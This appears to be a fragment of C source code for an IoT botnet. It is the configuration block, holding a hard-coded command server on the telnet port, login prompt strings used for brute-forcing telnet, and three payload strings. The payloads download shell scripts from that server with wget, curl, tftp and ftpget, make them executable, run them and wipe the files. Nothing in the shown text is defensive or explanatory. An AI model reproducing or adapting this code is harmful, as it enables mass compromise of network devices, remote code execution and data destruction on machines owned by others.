...
// CONFIG
//--------------------------------------------------------------------------------------------------------------------------------------------------------------------
unsigned char *commServer[] = { "104.248.29.196:23" };
char* phone[] = {":", "ogin", "sername", "assword", "Linux", "9615-cdp", (char*)0};
char *Busybox_Payload = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://104.248.29.196/bins.sh; curl -O http://104.248.29.196/bins.sh; /bin/busybox wget http://104.248.29.19/bin.sh; /bin/busybox tftp 104.248.29.196 -c get tftp1.sh; chmod 777 bins.sh; sh bins.sh; tftp 104.248.29.196 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp1.sh -g 104.248.29.196; chmod 777 tftp1.sh; sh tftp1.sh; ftpget -v -u anonymous -p anonymous -P 104.248.29.196 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf bins.sh tftp1.sh tftp1.sh ftp1.sh; rm -rf *\r\n"; //Telnet Scanner Must implement Busybox.
char *Payload = "cd /tmp; rm -rf *; cd /tmp/; wget http://104.248.29.196/bins.sh; sh bins.sh; rm -rf bins.sh; cd /tmp/; wget http://104.248.29.196/bins.sh; sh bins.sh; rm -rf bins.sh"; //Normal Payload Without busybox Implemented.
char *phonepayload = "cd /tmp; rm -rf *; cd /tmp/; wget http://104.248.29.196/bins.sh; sh bins.sh; rm -rf bins.sh; cd /tmp/; wget http://104.248.29.196/bins.sh; sh bins.sh; rm -rf bins.sh\r\n";
